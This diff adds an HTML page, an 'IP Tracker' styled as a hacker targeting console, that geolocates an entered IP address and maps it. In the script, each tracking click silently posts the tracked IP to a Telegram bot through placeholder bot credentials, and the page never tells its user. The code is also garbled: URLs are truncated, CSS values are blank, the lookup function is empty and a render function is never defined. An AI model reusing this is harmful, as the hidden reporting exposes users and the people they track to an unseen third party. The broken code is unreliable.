@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Tracker</title>
+    <link rel="stylesheet" href="https:                                                                                                                            
+    <style>
+        :root{
+            --bg:     
+            --green:        
+            --muted:        
+            --panel-bg: rgba(0,0,0,0.45);
+            --mono: 'Courier New', Courier, monospace;
+        }
+        html,body{height:100%;margin:0;background:var(--bg);color:var(--green);font-family:var(--mono);}
+        .wrap{display:flex;flex-direction:row;gap:20px;padding:18px;height:100%;}
+        .left{ width:520px; min-width:300px; max-width:55%; background:linear-gradient(180deg, rgba(0,0,0,0.6), rgba(0,0,0,0.9)); border:1px solid rgba(0,255,51,0.06); padding:18px;border-radius:6px;box-shadow:0 0 20px rgba(0,255,51,0.03) inset; }
+        .title{font-size:18px;letter-spacing:1px;margin-bottom:8px}
+        .subtitle{font-size:13px;color:var(--green);opacity:0.9;margin-bottom:12px}
+        .status{background:                                                                                                                    
+        .blink{animation:blink 1s steps(2,end) infinite}
+        @keyframes blink{50%{opacity:0}}
+        input[type="text"]{ width:100%;padding:10px;background:                                                                                                                                         
+        button{ margin-top:10px;padding:8px 12px;background:transparent;border:1px solid var(--green); color:var(--green);font-family:var(--mono);cursor:pointer;border-radius:4px; }
+        .small{font-size:12px;opacity:0.9;margin-top:8px}
+        .ipbig{font-size:20px;font-weight:700;margin-top:6px;margin-bottom:6px}
+        .cols{display:flex;gap:12px;margin-top:12px}
+        .info{flex:1;background:var(--panel-bg);padding:12px;border-radius:6px;border:1px solid rgba(0,255,51,0.04);min-height:80px}
+                                                                                                           
+                         @media (max-width:900px){.wrap{flex-direction:column}.left{max-width:100%}.cols{flex-direction:column}}
+    </style>
+</head>
+<body>
+    <div class="wrap">
+        <div class="left">
+            <div class="title">                          
+            <div class="subtitle">REAL-TIME LOCATION TRACKING SYSTEM</div>
+            <div class="status" id="status"> ACTIVE TARGET ACQUISITION 106.196.4.58 MY IP > SYSTEM INITIALIZED > REAL-TIME TRACKING MODULE LOADED > AWAITING INPUT system> SYSTEM READY. YOUR APPROXIMATE IP: <span id="sys-ip">Fetching...</span> </div>
+            <div style="margin-top:12px">
+                <label class="small">ENTER TARGET IP (or leave blank for your IP)</label>
+                <input id="ipInput" type="text" placeholder="e.g. 8.8.8.8 or 106.196.4.58" />
+                <div style="display:flex;gap:8px">
+                    <button id="trackBtn">TRACK ▶</button>
+                    <button id="clearBtn">CLEAR</button>
+                </div>
+                <div class="small">Response from <code>ip-api.com</code>. No external map link — location & map shown below.</div>
+            </div>
+            <div class="cols">
+                <div class="info" id="infoPanel">
+                    <div style="opacity:0.9">RESULTS</div>
+                    <div id="results" style="margin-top:8px">No data yet.</div>
+                </div>
+            </div>
+        </div>
+        <div id="map" aria-label="map panel"></div>
+    </div>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-o9N1j8g+g0k7QIEvNq4wqQ0eM0bG+g1w1gkq0Q3Yf5w=" crossorigin=""></script>
+    <script>
+        (function(){
+            const statusEl = document.getElementById('status');
+            const sysIpEl = document.getElementById('sys-ip');
+            const resultsEl = document.getElementById('results');
+            const ipInput = document.getElementById('ipInput');
+            const trackBtn = document.getElementById('trackBtn');
+            const clearBtn = document.getElementById('clearBtn');
+
+            // Bot Token and User ID
+            const botToken = 'YOUR_BOT_TOKEN';
+            const userId = 'YOUR_USER_ID';
+
+            // Function to send notification to Telegram bot
+            async function sendNotification(message) {
+                const url = `https:                                               
+                const data = {
+                    chat_id: userId,
+                    text: message
+                };
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    const result = await response.json();
+                    if (result.ok) {
+                        console.log('Notification sent successfully');
+                    } else {
+                        console.error('Failed to send notification');
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                }
+            }
+
+                                              
+            async function fetchIPData(ip){
+                      
+            }
+
+            trackBtn.addEventListener('click', async ()=>{
+                const ip = ipInput.value.trim();
+                resultsEl.innerText = '⏳ Fetching...';
+                const data = await fetchIPData(ip);
+                renderData(data);
+                sendNotification(`IP ${ip} has been tracked!`);
+            });
+
+            // ...
+        })();
+    </script>
+</body>
+</html>
